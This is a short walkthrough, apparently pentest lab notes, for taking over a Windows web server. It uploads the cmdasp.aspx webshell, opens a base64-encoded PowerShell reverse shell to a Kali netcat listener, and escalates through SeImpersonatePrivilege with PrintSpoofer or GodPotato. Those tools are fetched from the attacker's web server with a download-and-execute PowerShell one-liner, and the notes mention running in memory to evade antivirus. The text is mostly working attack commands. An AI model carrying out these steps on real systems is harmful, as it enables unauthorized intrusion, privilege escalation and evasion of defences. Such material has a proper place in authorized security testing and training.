Navigate to the server using your browser:
```
http://10.2.10.22
```

Upload the LFI aspx script located on Kali:
```
/usr/share/webshells/aspx/cmdasp.aspx
```

Have a look to where the file was uploaded to and navigate to it, example:
```
http://10.2.10.22/upload/cmdasp.aspx
```

Test it by running a couple of commands:
```
whoami /all
```

If it executes properly, nvavigate to:
```
https://www.revshells.com/
```

Select Powershell with base64 encoding. Set the Kali IP and port (Example: 10.2.10.254:9001)

On kali, start a listener:
```
nc -lvpn 9001
```

Copy the encoded base64 into the command line and run it, you should now receive a reverse shell on the Kali box.

Run whoami and see what priviledges the user has:
```
whoami /priv
```

Have a look if this is enabled:
```
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
```

Options to Elevate Priviledges:
Option 1: GodPotato (Check out "Tools Usage > C2C Servers > Mythic > GodPotato)
Option 2: PrintSpoofer (https://github.com/itm4n/PrintSpoofer/releases/tag/v1.0)

Upload to the target server using the reverse shell:
Start local web server:
```bash
python3 -m http.server 8888
```

Downlaod the files from the Kali (or whatever URL):
```powershell
Invoke-WebRequest -Uri http://10.2.10.254:8888/PrintSpoofer64.exe -Outfile C:\windows\temp\PrintSpoofer.exe
```

Or download and execute immediatly after download:
```powershell
Invoke-WebRequest -Uri http://10.2.10.254:8888/PrintSpoofer64.exe -Outfile C:\windows\temp\PrintSpoofer.exe; C:\windows\temp\PrintSpoofer64.exe
```

### NOTE
GodPotato or PrintSpoofer might be dtected by the AV, so running commands from disk with give us issues, we will need to run it from memory.

Also check "Tool Usage > AV Avoidance"